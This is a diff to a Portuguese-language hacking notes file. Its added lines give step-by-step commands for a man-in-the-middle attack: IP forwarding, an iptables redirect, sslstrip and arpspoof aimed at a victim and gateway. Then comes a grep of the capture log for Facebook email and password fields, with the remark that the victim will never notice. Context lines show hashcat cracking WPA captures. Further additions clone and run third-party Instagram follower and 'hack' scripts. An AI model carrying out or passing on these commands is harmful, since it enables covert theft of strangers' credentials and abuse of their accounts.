@@ -34,6 +34,30 @@ https://hashcat.net/cap2hashcat/ (FUNCIONA)
 sudo hashcat -m 22000 -a3 ?d?d?d?d (aquivo).hccapx
 
 --------------------------------------------------------------------------------------------------
+   ## Capturando dados por rede ##
+$ Passo 1 
+$ Ativar o ip_forward para redirecionar o tráfego.
+echo "1" > /proc/sys/net/ipv4/ip_forward
+
+$ Passo 2 
+$ Crie a regra de redirecionamento no iptables da porta 80 para a porta 8080.
+iptables -t nat -A PREROUTING -p tcp –dport 80 -j REDIRECT –to-port 8080
+
+$ Passo 3
+$ Execute o SSLSTRIP com as opções -a -l
+sslstrip -a -l 8080
+
+$ Passo 4
+$ Abra um novo console e execute o arpspoof.
+arpspoof -i wlan0 -t "Ip vitmina"  "Gateway da rede"
+
+$ Passo 5
+$ Imagina que a vítima obviamente sem saber acessa o Facebook e informa seu E-mail marcos@100security.com.br e Senha P@ssw0rd e jamais perceberá que seus dados estão sendo capturados.
+
+$ Passo 6
+$ Um arquivo nomeado como sslstrip.log é criado contendo todo tráfego capturado, no caso do Facebook basta realizar uma busca dentro do arquivo como no exemplo abaixo:
+cat sslstrip.log | grep email=
+
 
    ## Capturando dados sociais por WIFI ##
 
@@ -200,10 +224,19 @@ Pesquisar mais a fundo configurações, remoções de metadados, privacidade par
 
   ## Adicionando seguidores no instagram
 
+Método 1 (só tem opção de seguir)
 sudo git clone https://github.com/termuxprofessor/insfollow.git
 cd insfollow
 chmod +x insfollow.sh
 bash insfollow.sh
+
+Método 2 (tem mais opções)
+apt install curl
+apt install openssl
+git clone https://github.com/SACHINSIROHI47/Inshackle.git
+cd inshackle
+chmod +x inshackle.sh
+bash inshackle.sh
 
 -------------------------------------------------------------------------------------------------------
 
